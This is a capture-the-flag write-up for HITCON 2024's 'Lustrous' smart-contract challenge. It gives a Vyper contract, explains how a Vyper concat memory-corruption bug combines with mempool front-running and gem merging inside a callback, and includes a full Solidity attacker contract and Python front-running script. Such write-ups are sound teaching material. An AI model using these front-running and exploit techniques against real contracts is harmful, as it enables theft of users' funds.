---
title: Blockchain - Lustrous
description: 2024 | HITCON CTF | web3
tags:
    - smart contract
    - vyper
    - frontrun
    - buffer overflow
    - compiler bug
---

## Description

"In a world inhabited by crystalline lifeforms called The Lustrous, every unique gem must fight for their way of life against the threat of lunarians who would turn them into decorations." – Land of the Lustrous

> nc lustrous.chal.hitconctf.com 31337

??? note "land_of_the_lustrous.vy"

    ```py
    #pragma version ==0.3.10

    enum GemStatus:
        ACTIVE
        INACTIVE
        DESTROYED

    struct Gem:
        health: int256
        max_health: int256
        attack: int256
        hardness: int256
        status: GemStatus

    struct Lunarian:
        health: int256
        attack: int256
        rounds: uint256

    interface Master:
        def get_actions() -> DynArray[uint8, MAX_ROUNDS]: view
        def decide_continue_battle(round: uint256, lunarian_health: int256) -> bool: nonpayable

    stage: public(uint8)
    master_addr: public(address)
    lunarian_addr: public(address)
    sequences: public(HashMap[address, uint32])
    gems: public(HashMap[bytes32, Gem])
    assigned_gems: public(HashMap[address, uint32])
    continued: public(HashMap[address, bool])

    ACTIVE_HEALTH_THRESHOLD: constant(int256) = 64
    STAGES: constant(uint8) = 3
    MAX_ROUNDS: constant(uint256) = 300
    LUNARIANS: constant(Lunarian[STAGES]) = [
        Lunarian({ health: 1_000, attack: 10_000, rounds: 100 }),
        Lunarian({ health: 10_000, attack: 100_000, rounds: 200 }),
        Lunarian({ health: 1 << 64, attack: 1 << 128, rounds: 300 }),
    ]

    @external
    @payable
    def __init__():
        assert msg.value == as_wei_value(1_000_000, "ether")
        self.lunarian_addr = msg.sender

    @external
    @view
    def is_solved() -> bool:
        return self.balance == 0

    @external
    def register_master():
        assert self.master_addr == empty(address), "master already registered"
        self.master_addr = msg.sender

    @external
    def transfer_master(new_master_addr: address):
        assert self.master_addr != empty(address), "master not registered"
        assert self.master_addr == msg.sender, "only master can transfer master"
        self.master_addr = new_master_addr

    @external
    @payable
    def create_gem() -> Gem:
        assert self.master_addr == msg.sender, "only master can create gem"
        assert msg.value == as_wei_value(1, "ether"), "invalid value"

        random: int256 = abs(convert(keccak256(convert(block.number, bytes32)), int256))
        gem: Gem = Gem({
            health: max(random % 256, ACTIVE_HEALTH_THRESHOLD),
            max_health: random % 256,
            attack: (random / 256) % 256,
            hardness: (random / (256 * 256)) % 256,
            status: GemStatus.ACTIVE,
        })
        self.gems[self.get_gem_id(msg.sender, self.sequences[msg.sender])] = gem
        self.sequences[msg.sender] += 1
        return gem

    @external
    def merge_gems() -> Gem:
        assert self.master_addr == msg.sender, "only master can merge gems"
        assert self.sequences[msg.sender] >= 2, "not enough gems to merge"

        gem1: Gem = self.gems[self.get_gem_id(msg.sender, self.sequences[msg.sender] - 2)]
        gem2: Gem = self.gems[self.get_gem_id(msg.sender, self.sequences[msg.sender] - 1)]

        assert (gem1.status == GemStatus.ACTIVE and gem2.status == GemStatus.INACTIVE) \
            or (gem1.status == GemStatus.INACTIVE and gem2.status == GemStatus.ACTIVE) \
            or (gem1.status == GemStatus.INACTIVE and gem2.status == GemStatus.INACTIVE), "invalid gem status"

        gem: Gem = Gem({
            health: gem1.health + gem2.health,
            max_health: gem1.max_health + gem2.max_health,
            attack: gem1.attack + gem2.attack,
            hardness: (gem1.hardness + gem2.hardness) / 2,
            status: self.calc_status(gem1.health + gem2.health),
        })
        self.gems[self.get_gem_id(msg.sender, self.sequences[msg.sender] - 2)] = gem
        self.sequences[msg.sender] -= 1
        return gem

    @external
    def pray_gem():
        assert self.master_addr == msg.sender, "only master can pray gem"
        assert self.sequences[msg.sender] >= 1, "not enough gems to pray"
        self.sequences[msg.sender] -= 1

    @external
    def assign_gem(sequence: uint32):
        assert self.master_addr == msg.sender, "only master can assign gem"
        self.assigned_gems[msg.sender] = sequence

    @external
    def battle(lunarian_actions: DynArray[uint8, MAX_ROUNDS]) -> (bool, int256, int256):
        assert self.lunarian_addr == msg.sender, "only lunarian can start battle"
        assert self.master_addr != empty(address), "master not registered"
        assert self.stage < STAGES, "invalid stage"

        lunarian: Lunarian = LUNARIANS[self.stage]
        master: Master = Master(self.master_addr)
        gem_actions: DynArray[uint8, MAX_ROUNDS] = master.get_actions()
        gem_id: bytes32 = self.get_gem_id(self.master_addr, self.assigned_gems[self.master_addr])

        assert self.assigned_gems[self.master_addr] < self.sequences[self.master_addr], "invalid assigned gem"
        assert len(lunarian_actions) == lunarian.rounds and len(gem_actions) == lunarian.rounds, "invalid actions"
        assert self.gems[gem_id].status == GemStatus.ACTIVE, "gem is not active"

        for r in range(lunarian.rounds, bound=MAX_ROUNDS):
            # rock paper scissors
            lunarian_action: uint8 = lunarian_actions[r]
            gem_action: uint8 = gem_actions[r]
            assert lunarian_action <= 2 and gem_action <= 2, "invalid action"

            if lunarian_action == gem_action:
                continue

            master_win: bool = (lunarian_action == 0 and gem_action == 1) \
                or (lunarian_action == 1 and gem_action == 2) \
                or (lunarian_action == 2 and gem_action == 0)

            if master_win:
                lunarian.health -= self.gems[gem_id].attack
            else:
                self.gems[gem_id].health -= lunarian.attack / self.gems[gem_id].hardness

            if self.calc_status(self.gems[gem_id].health) != GemStatus.ACTIVE:
                master.decide_continue_battle(r, lunarian.health)
                if self.continued[self.master_addr]:
                    self.continued[self.master_addr] = False
                    self.gems[gem_id].health = self.gems[gem_id].max_health 

            self.gems[gem_id].status = self.calc_status(self.gems[gem_id].health)
            if self.gems[gem_id].status != GemStatus.ACTIVE or lunarian.health <= 0:
                break

        if self.gems[gem_id].status == GemStatus.ACTIVE \
            and (lunarian.health <= 0 or lunarian.health < self.gems[gem_id].health):
            if self.stage == 0:
                send(self.master_addr, as_wei_value(1, "ether"))
                self.stage += 1
            elif self.stage == 1:
                send(self.master_addr, as_wei_value(2, "ether"))
                self.stage += 1
            elif self.stage == 2:
                send(self.master_addr, self.balance)
                # congratz :)
            return True, lunarian.health, self.gems[gem_id].health
        else:
            self.stage = 0
            return False, lunarian.health, self.gems[gem_id].health

    @external
    @payable
    def continue_battle():
        assert self.master_addr == msg.sender, "only master can continue battle"
        assert msg.value == as_wei_value(1, "ether"), "invalid value"
        self.continued[msg.sender] = True

    @internal
    @pure
    def get_gem_id(master_addr: address, sequence: uint32) -> bytes32:
        master_addr_bytes: bytes20 = convert(master_addr, bytes20)
        sequence_bytes: bytes4 = convert(sequence, bytes4)
        gem_id: bytes32 = keccak256(concat(master_addr_bytes, sequence_bytes))
        return gem_id

    @internal
    @pure
    def calc_status(health: int256) -> GemStatus:
        if ACTIVE_HEALTH_THRESHOLD <= health:
            return GemStatus.ACTIVE
        elif 0 <= health:
            return GemStatus.INACTIVE
        else:
            return GemStatus.DESTROYED
    ```

## Solution

- Initially, there are 1,000,000 ether deposited into the contract, which we have to drain and solve the challenge. Only the `battle()` function in the contract can obtain ether
- The battle has three stages, each corresponding to a lunarian with different health and attack power. At each stage, if gem is still **active** and **has more health than the lunarian** after all rounds are over, the corresponding stage funds will go to us. Getting 1 or 2 ether each time has little effect, while the instance will automatically terminate in 10 minutes. Obviously, we have to win stage 2

    ```py
    if self.gems[gem_id].status == GemStatus.ACTIVE \
        and (lunarian.health <= 0 or lunarian.health < self.gems[gem_id].health):
        if self.stage == 0:
            send(self.master_addr, as_wei_value(1, "ether"))
            self.stage += 1
        elif self.stage == 1:
            send(self.master_addr, as_wei_value(2, "ether"))
            self.stage += 1
        elif self.stage == 2:
            send(self.master_addr, self.balance)
            # congratz :)
    ```

- The winner of each round in a stage is determined by `lunarian_actions` array and an array returned by `master.get_actions()`. We don't have permission to call the `battle()` function, but we can obtain `lunarian_actions` from the pending transaction. Then, front run the transaction of `battle()` to set `gem_actions` and win each round as desired :D

    ```py
    @external
    def battle(lunarian_actions: DynArray[uint8, MAX_ROUNDS]) -> (bool, int256, int256):
        assert self.lunarian_addr == msg.sender, "only lunarian can start battle"
        assert self.master_addr != empty(address), "master not registered"
        assert self.stage < STAGES, "invalid stage"

        lunarian: Lunarian = LUNARIANS[self.stage]
        master: Master = Master(self.master_addr)
        gem_actions: DynArray[uint8, MAX_ROUNDS] = master.get_actions()
        gem_id: bytes32 = self.get_gem_id(self.master_addr, self.assigned_gems[self.master_addr])
        ...
        for r in range(lunarian.rounds, bound=MAX_ROUNDS):
            # rock paper scissors
            lunarian_action: uint8 = lunarian_actions[r]
            gem_action: uint8 = gem_actions[r]
            assert lunarian_action <= 2 and gem_action <= 2, "invalid action"

            if lunarian_action == gem_action:
                continue

            master_win: bool = (lunarian_action == 0 and gem_action == 1) \
                or (lunarian_action == 1 and gem_action == 2) \
                or (lunarian_action == 2 and gem_action == 0)
        ...
    ```

- The lunarian in stage 2 has a huge amount of health but the initial attack of the gem is only 255 at most. It costs 1 ether to create a gem, and we only start with 1.5 ether. Even if we can merge gems to increase the attack power of a gem, it is still difficult to win in 300 rounds

    ```py
    LUNARIANS: constant(Lunarian[STAGES]) = [
        Lunarian({ health: 1_000, attack: 10_000, rounds: 100 }),
        Lunarian({ health: 10_000, attack: 100_000, rounds: 200 }),
        Lunarian({ health: 1 << 64, attack: 1 << 128, rounds: 300 }),
    ]
    ```

- A master can have multiple gems. The data of each gem is stored in the contract via `gem_id`. The `gem_id` is the hash of `master_addr` and a sequence number. The `get_gem_id()` internal function uses the `concat` built-in function, which is related to a memory buffer overflow vulnerability[^concat]. That is, if a function calls an internal function that uses `concat`, the leading bytes of its first declared variable may be overwritten with zeros. In `get_gem_id()`, `sequence_bytes` will be mloaded and mstored right after previous copied `master_addr_bytes`, causing a 20-byte memory buffer overflow

    ```py
    @internal
    @pure
    def get_gem_id(master_addr: address, sequence: uint32) -> bytes32:
        master_addr_bytes: bytes20 = convert(master_addr, bytes20)
        sequence_bytes: bytes4 = convert(sequence, bytes4)
        gem_id: bytes32 = keccak256(concat(master_addr_bytes, sequence_bytes))
        return gem_id
    ```

- During the battle, if the gem is not in an active health, `master.decide_continue_battle` will be called, giving us the opportunity to merge gems and get a gem with negative health. By combining the vulnerability of `concat`, we can obtain a gem with high health to win the battle ;)
  
    ```py
    @external
    def merge_gems() -> Gem:
        ...
        gem: Gem = Gem({
            health: gem1.health + gem2.health,
            max_health: gem1.max_health + gem2.max_health,
            attack: gem1.attack + gem2.attack,
            hardness: (gem1.hardness + gem2.hardness) / 2,
            status: self.calc_status(gem1.health + gem2.health),
        })
        self.gems[self.get_gem_id(msg.sender, self.sequences[msg.sender] - 2)] = gem
        self.sequences[msg.sender] -= 1
        return gem
    ```

### Exploitation

The exploitation steps are as follows:

1. Create `gem0` with a favorable attack value and win stage 0 with it
2. Create `gem1` with a favorable health and draw stage 1 to reset stage to 0 without losing any health
3. Intentionally lose stage 0 with `gem1` to make its status inactive
4. Win stage 0 with `gem0`
5. In stage 1, `gem0`'s health can go negative with only one attack. During the `master.decide_continue_battle()`, `gem0` is still active and can pass the status check in `merge_gems()` along with `gem1`. After merging, `gem0` has enough health to win stage 1 and 2

```solidity
contract Master {

    int256 constant ACTIVE_HEALTH_THRESHOLD = 64;

    ILandOfTheLustrous land;
    uint8[] actions;
    bool canMerge;

    constructor(ILandOfTheLustrous _land) {
        land = _land;
        _land.register_master();
    }

    function first() external payable {
        int256 random = int256(uint256(keccak256(abi.encode(block.number))));
        if (random < 0) {
            random = -random;
        }
        require((random / 256) % 256 >= 10);
        land.create_gem{value: 1 ether}();
        land.assign_gem(0);
    }

    function second() external {
        int256 random = int256(uint256(keccak256(abi.encode(block.number))));
        if (random < 0) {
            random = -random;
        }
        int256 health = random % 256;
        if (health < ACTIVE_HEALTH_THRESHOLD) {
            health = ACTIVE_HEALTH_THRESHOLD;
        }
        int256 hardness = (random / (256 * 256)) % 256;
        while (health >= ACTIVE_HEALTH_THRESHOLD) {
            health -= 10_000 / hardness;
        }
        require(health >= 0);
        land.create_gem{value: 1 ether}();
        land.assign_gem(1);
    }

    function third() external {
        land.assign_gem(0);
        canMerge = true;
    }

    function set_actions(uint8[] memory lunarian_actions, uint256 start, uint8 draw) external {
        uint256 len = lunarian_actions.length;
        uint8[] memory _actions = new uint8[](len);
        for (uint256 i; i < start; i++) {
            _actions[i] = (lunarian_actions[i] + 2 + draw) % 3;
        }
        for (uint256 i = start; i < len; i++) {
            _actions[i] = (lunarian_actions[i] + 1) % 3;
        }
        actions = _actions;
    }

    function get_actions() external view returns (uint8[] memory) {
        return actions;
    }

    function decide_continue_battle(
        uint256,
        int256
    ) external returns (bool) {
        if (canMerge) {
            land.merge_gems();
        }
        return true;
    }

    receive() external payable {}
}
```

```py
import pwn
import hashlib
import time
from typing import Callable
from threading import Thread

from cheb3 import Connection
from cheb3.utils import load_compiled, decode_data

def connect():
    return pwn.remote("lustrous.chal.hitconctf.com", 31337)

def solve_pow(p):
    cmd = p.recvline_contains(b"python3").decode().strip().split(" ")
    preimage_prefix = cmd[-2].encode()
    bits = int(cmd[-1])
    for i in range(0, 1 << 32):
        your_input = str(i).encode()
        preimage = preimage_prefix + your_input
        digest = hashlib.sha256(preimage).digest()
        digest_int = int.from_bytes(digest, "big")
        if digest_int < (1 << (256 - bits)):
            ans = your_input
            break
    p.sendlineafter(b"YOUR_INPUT =", ans)

def do_battle():
    p = connect()
    p.sendlineafter(b"action?", b"3")
    solve_pow(p)
    p.sendlineafter(b"uuid please:", uuid)
    time.sleep(5)
    p.close()

def frontrun(handler: Callable) -> bool:
    pending_filter = conn.w3.eth.filter('pending')

    battle_thread = Thread(target=do_battle, args=[])
    battle_thread.start()

    while True:
        pending_entries = pending_filter.get_new_entries()
        if pending_entries != []:
            print("[+] Frontrunning")
            for txn_hash in pending_entries:
                txn = conn.w3.eth.get_transaction(txn_hash)
                if txn['to'] == land_addr:
                    decoded_input = decode_data(txn['input'][4:], ["uint8[]"])
                    handler(decoded_input, txn['gasPrice'])
                    return True
        
        if not battle_thread.is_alive():
            print("[-] Frontrun failed")
            return False

def frontrun_handler(lunarian_actions: list[int], gas_price: int):
    master.functions.set_actions(lunarian_actions, start_index, to_draw).send_transaction(gas_price=gas_price + 100)

p = connect()
p.sendlineafter(b"action?", b"1")
solve_pow(p)
uuid = p.recvline_contains(b"uuid:").split(b" ")[-1]
print(f"{uuid = }")
conn = Connection(p.recvline_contains(b"rpc endpoint:").decode().split(" ")[-1])
account = conn.account(p.recvline_contains(b"private key:").decode().split(" ")[-1])
land_addr = p.recvline_contains(b"challenge contract:").decode().split(" ")[-1]

land_abi, _ = load_compiled("ILandOfTheLustrous.sol")
land = conn.contract(account, abi=land_abi, address=land_addr)

master_abi, master_bin = load_compiled("PoC.t.sol", "Master")
master = conn.contract(account, abi=master_abi, bytecode=master_bin)
master.deploy(land_addr)

while True:
    try:
        master.functions.first().send_transaction(value=int(1e18))
        break
    except:
        continue

start_index, to_draw = 0, 0
frontrun(frontrun_handler)  # win stage 0

while True:
    try:
        master.functions.second().send_transaction()
        break
    except:
        continue

start_index, to_draw = 200, 1
frontrun(frontrun_handler)  # draw stage 1

start_index, to_draw = 100, 0
frontrun(frontrun_handler)  # lose stage 0

master.functions.third().send_transaction()

start_index = 0
frontrun(frontrun_handler)  # win stage 0

start_index = 1
frontrun(frontrun_handler)  # lose -> merge -> win stage 1

start_index = 0
frontrun(frontrun_handler)  # win stage 2

print("solved?", land.caller.is_solved())

if land.caller.is_solved():
    p = connect()
    p.sendlineafter(b"action?", b"4")
    p.sendlineafter(b"uuid please:", uuid)
    p.interactive()
```

### Flag

> hitcon{f1y_m3_t0_th3_m00n_3a080ea144010d74}

[^concat]: [concat built-in can corrupt memory · Advisory · vyperlang/vyper](https://github.com/vyperlang/vyper/security/advisories/GHSA-2q8v-3gqq-4f8p)
